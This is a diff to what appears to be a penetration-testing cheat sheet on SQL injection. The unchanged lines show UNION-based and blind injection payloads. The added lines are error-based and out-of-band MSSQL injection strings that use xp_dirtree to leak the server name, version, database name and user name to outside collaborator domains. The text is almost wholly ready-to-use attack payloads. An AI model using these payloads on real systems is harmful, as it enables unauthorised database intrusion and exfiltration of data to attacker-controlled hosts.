@@ -58,8 +58,6 @@ Until error occurs, then:
 1' UNION ALL SELECT {columnname} FROM {tablename};--
 ```
 
-\\
-
 ## Blind injection
 
 Apply in URL
@@ -92,7 +90,14 @@ www.example.com/xxx.php?id=1 or 1=1
 ' OR SUBSTRING(CURRENT_USER,1,3)='DBO
 ' OR LEN(db_name())=13;--
 ' OR SUBSTRING(db_name(),1,5)='xxxxx';--
-'*cast((SELECT @@version) as int)*'
+'*cast((SELECT @@version) as int)*'        # Error-based
+------------------------------------------
+OOB
+';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(@@servername,1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
+';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(@@version,1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
+';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(DB_NAME(1),1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
+';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(USER_NAME(1),1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
+');declare @q varchar(200);set @q='\\fj2meelkqbazaz61dntl0yzycpih69uy.'+(SELECT SUBSTRING(@@version,1,9))+'.oasti'+'fy.com\huh'; exec master.dbo.xp_dirtree @q;--
 ```
 
 ## NodeJS / MongoDB
